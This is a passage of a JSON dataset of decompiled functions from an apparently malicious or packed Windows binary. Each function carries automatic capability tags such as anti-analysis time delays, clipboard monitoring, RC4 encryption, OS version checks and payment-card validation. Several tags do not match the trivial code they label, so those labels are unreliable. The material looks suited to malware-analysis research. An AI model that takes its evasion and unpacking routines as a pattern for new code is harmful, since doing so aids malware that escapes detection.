        "decompiled_code": "\nbool fcn.004028fc(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar4;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar2 = fcn.00402782();\n    iVar3 = 0;\n    if (*(iVar2 + 1 + *(iVar2 + 0x3c)) == 'E') {\n        iVar3 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    bVar4 = true;\n    if (uVar1 != 5) {\n        bVar4 = 0x549352b9 < *(iVar3 + 8) && uVar1 < 6;\n    }\n    return bVar4;\n}\n",
        "token_count": 244
    },
    "004017c9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t fcn.004017c9(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t auStack120 [12];\n    uint32_t uStack72;\n    uint32_t uStack68;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_bp_ch;\n    \n    uStack24 = 0xb606f69;\n    uStack28 = 0;\n    uStack32 = 0x35f0b880;\n    uStack52 = 0;\n    uStack56 = 0x6af3befa;\n    uStack48 = 0x401;\n    iStack44 = 0x6b;\n    iVar2 = (*_sym.imp.USER32.dll_ChildWindowFromPoint)(0xbcf2f8, 0x6b00000401);\n    auStack120[0] = iVar2 != 0;\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(&uStack52);\n    uVar3 = iStack44 + (0xe0c8c3b1 < uStack48);\n    uVar4 = uVar3 - uStack68;\n    bVar1 = uStack72 <= uStack48 + 0x1f373c4e;\n    if (uVar4 != 0) {\n        bVar1 = uStack68 <= uVar3;\n    }\n    if (!bVar1) {\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultLCID)();\n        (*_sym.imp.KERNEL32.dll_GetProcessIoCounters)(0xb300, auStack120);\n        return uVar4;\n    }\n    uStack40 = uStack40 ^ 0x75de1ff3;\n    fcn.00402313(0, 0);\n    return uStack40;\n}\n",
        "token_count": 465
    },
    "00402048": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402048(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t arg_8h_00;\n    uint32_t uVar4;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_18h = 0;\n    var_1ch = 0;\n    do {\n        var_1ch = (*(var_18h * 0x70 + 0x405094) ^ *(var_18h * 0x70 + 0x405098)) + var_1ch;\n        var_18h = var_18h + 1;\n    } while (var_18h != 5);\n    arg_8h_00 = fcn.004011c8(4, var_1ch);\n    var_34h = 0;\n    var_30h = 0;\n    do {\n        iVar1 = *(var_34h * 0x70 + 0x405044);\n        uVar2 = *(var_34h * 0x70 + 0x405098);\n        uVar3 = *(var_34h * 0x70 + 0x405094);\n        uVar4 = uVar3 ^ uVar2;\n        var_20h = 0;\n        if (uVar2 != uVar3) {\n            do {\n                *(arg_8h_00 + var_30h + var_20h) = *(iVar1 + var_20h);\n                var_20h = var_20h + 1;\n            } while (var_20h != uVar4);\n        }\n        var_34h = var_34h + 1;\n        var_30h = uVar4 + var_30h;\n    } while (var_34h != 5);\n    fcn.00401e40(arg_8h_00, arg_8h_00, var_1ch);\n    arg_8h[3] = 0x4980;\n    arg_8h[1] = 0x12a00;\n    arg_8h[2] = arg_8h_00 + 0x3af;\n    *arg_8h = arg_8h_00 + 0x536d;\n    return 0;\n}\n",
        "token_count": 623
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n\nint16_t __cdecl fcn.00401000(uint arg_8h)\n\n{\n    uint var_eh;\n    \n    // [00] -r-x section size 12288 named .text\n    if (arg_8h - 0x61U < 0x1a) {\n        arg_8h._0_2_ = arg_8h + -0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 110
    },
    "00401271": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401271(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    uVar1 = arg_8h & 3;\n    if (2 < arg_ch) {\n        uVar1 = arg_8h % 0x32;\n    }\n    return uVar1;\n}\n",
        "token_count": 103
    },
    "004012bb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004012bb(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = arg_8h & 7;\n    if (arg_8h < 8) {\n        uVar1 = arg_8h;\n    }\n    return uVar1;\n}\n",
        "token_count": 81
    },
    "004013db": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "monitor clipboard content"
        ],
        "decompiled_code": "\nvoid fcn.004013db(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_8h;\n    \n    var_8h = 0x5019962f;\n    var_28h = 0;\n    do {\n        iVar3 = var_8h + 0xafe6757e;\n        (*_sym.imp.GDI32.dll_OffsetRgn)(0x494dab, 0xba3, 0x50199c29 - var_8h);\n        (*_sym.imp.USER32.dll_AddClipboardFormatListener)(0x221222);\n        iVar1 = 0x5019981e - var_8h;\n        (*_sym.imp.USER32.dll_DrawEdge)(0xf2aa7, &var_18h, 0x69, 0xfb2);\n        sub.USER32.dll_DdeGetLastError(iVar1);\n        (*_sym.imp.USER32.dll_AnimateWindow)(0x32adcd, 0x5f0, 0xd41);\n        (*_sym.imp.KERNEL32.dll_AllocConsole)();\n        var_1ch = 0xc8c;\n        (*_sym.imp.KERNEL32.dll_NotifyUILanguageChange)(iVar3, 0x4042ae, 0x4042ae, iVar3, &var_1ch);\n        uVar2 = var_8h ^ 0x5019962e;\n        (*_sym.imp.GDI32.dll_SetMetaRgn)(0x8ee598);\n        var_28h = var_28h + uVar2;\n    } while (var_28h != 0x2ee);\n    return;\n}\n",
        "token_count": 493
    },
    "004015e7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.004015e7(void)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uStack144;\n    uint32_t uStack136;\n    uint32_t uStack132;\n    uint uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar auStack72 [20];\n    int32_t iStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_bp_ch;\n    \n    uStack28 = 0;\n    uStack32 = 0x556fb6e9;\n    uStack36 = 0x50e74a64;\n    uStack84 = 0;\n    uStack88 = 0x6f1b79c2;\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(auStack72);\n    while( true ) {\n        uStack96 = 0x972;\n        iVar6 = iStack40 + 0x5e317dac;\n        (*_sym.imp.KERNEL32.dll_GetConsoleProcessList)(&uStack96, 1);\n        uVar3 = (*_sym.imp.USER32.dll_GetSysColor)(uStack136);\n        iStack92 = iStack52 + iVar6;\n        if ((uStack132 ^ 0x66020923 | uStack136) != 0) {\n            iVar6 = 0x50e74a64 - iStack52;\n            iVar5 = (*_sym.imp.USER32.dll_IsDlgButtonChecked)(0x9821e7, iStack92);\n            if (iVar5 != iVar6) {\n                return;\n            }\n        }\n        uVar2 = uStack44;\n        uVar4 = uStack48 ^ 0x2a106072;\n        (*_sym.imp.USER32.dll_GetMenuState)(0x5737ed, 0xfb5, 0xfb5);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0x578306);\n        bVar1 = uVar3 <= uVar2;\n        if (uVar4 != uStack144) {\n            bVar1 = uStack144 <= uVar4;\n        }\n        if (bVar1) break;\n        if (0x10a < auStack72) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "004023c7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004023fc)\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nchar * __cdecl fcn.004023c7(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint var_bp_4h;\n    \n    pcVar1 = arg_8h + *(arg_8h + 0x3c);\n    if (*pcVar1 != 'P') {\n        return NULL;\n    }\n    pcVar2 = NULL;\n    if (pcVar1[1] == 'E') {\n        pcVar2 = pcVar1;\n    }\n    return pcVar2;\n}\n",
        "token_count": 154
    },
    "004031c9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403230)\n\nuint fcn.004031c9(void)\n\n{\n    uint uVar1;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x4050f39b;\n    var_8h = 0x2d81b40e;\n    fcn.00401c60(&var_28h, 0x40428e, 0x10);\n    uVar1 = fcn.00401ae0();\n    uVar1 = fcn.00403241(uVar1, &var_28h);\n    return uVar1;\n}\n",
        "token_count": 167
    },
    "004012e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012e2(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    arg_8h[3] = 0x4980;\n    arg_8h[1] = 0x12a00;\n    arg_8h[2] = arg_ch + 0x3af;\n    *arg_8h = arg_ch + 0x536d;\n    return;\n}\n",
        "token_count": 104
    },
    "0040131c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040131c(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_4h;\n    \n    var_4h = 0x26a0de6;\n    fcn.00401c60(&var_24h, 0x40429e, 0x10);\n    arg_8h = fcn.00401ae0();\n    fcn.00403241(arg_8h, &var_24h);\n    return;\n}\n",
        "token_count": 118
    },
    "00401366": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401366(void)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = 0x49d1ec4f;\n    var_24h = 0xc43;\n    (*_sym.imp.KERNEL32.dll_ApplicationRecoveryInProgress)(&var_24h);\n    (*_sym.imp.GDI32.dll_CloseMetaFile)(0xbbf10e);\n    (*_sym.imp.GDI32.dll_SetLayout)(0x8c231f, var_4h ^ 0x49d1e602);\n    (*_sym.imp.USER32.dll_ReplyMessage)(0x918b3c);\n    (*_sym.imp.USER32.dll_TranslateMessage)(&var_20h);\n    return;\n}\n",
        "token_count": 210
    },
    "00401a8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401a8c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_10h = -1;\n    if ((iVar1 != 0) && (var_10h = iVar1,  iVar1 == 1)) {\n        var_10h = 0;\n    }\n    return var_10h;\n}\n",
        "token_count": 135
    },
    "00401c0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401c0b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 143
    },
    "00402764": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402764(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401ae0();\n    fcn.00403241(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 73
    }
}